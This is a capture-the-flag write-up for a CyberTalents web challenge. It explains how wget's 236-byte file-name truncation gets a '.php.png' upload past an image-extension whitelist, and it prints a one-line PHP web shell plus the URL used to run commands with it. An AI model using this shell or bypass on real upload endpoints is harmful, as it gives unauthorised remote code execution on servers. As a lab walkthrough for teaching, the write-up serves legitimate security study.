# F2Up Challenge on CyberTalents

[Challenge Link](https://cybertalents.com/challenges/web/f2up)

**The challenge includes a file upload feature that accepts a URL, then uses the `wget` command on the server to download the image.**

In the beginning, I thought it was an SSRF vulnerability. However, the server validates the URL using a whitelist, allowing only links that end with image extensions such as .jpg, .png, .gif, and .svg.
The server does not return the response content; it simply sends a request using the wget command to download the image.
Since Linux cannot handle file names longer than 255 bytes, attempting to download a file with a longer name causes an error.
Moreover, wget itself cannot handle file names longer than 236 bytes in this context. When that happens, the tool automatically truncates the file name to 236 bytes, as you can see in the screenshot

<img width="1918" height="878" alt="image" src="https://github.com/user-attachments/assets/2868ef43-e60b-41ea-b7be-d6f19d158575" />

---

## Steps to Exploit

1. On your local machine, create a PHP shell with an oversized filename (close to 255 bytes):
   ```bash
   echo '<?php system($_GET["x"]); ?>' > $(python3 -c "print('sh' + 'e'*228 + 'll.php.png')")

2. Push the file to your GitHub repository and get its raw URL.
3. Submit the raw URL to the upload function on the challenge website.
4. After successful upload, access the uploaded file:
`/images/sheeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeell.php?x=ls`



**My raw file link:** `https://raw.githubusercontent.com/k7edr0x/F2Up/refs/heads/main/sheeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeel.php.gif`

<img width="1919" height="214" alt="image" src="https://github.com/user-attachments/assets/802c50e9-3e60-4ff4-8522-392b9fb909b5" />



I hope it helps others understand the logic behind the exploitation.  
– [k7edr0x](https://x.com/k7edr0x)







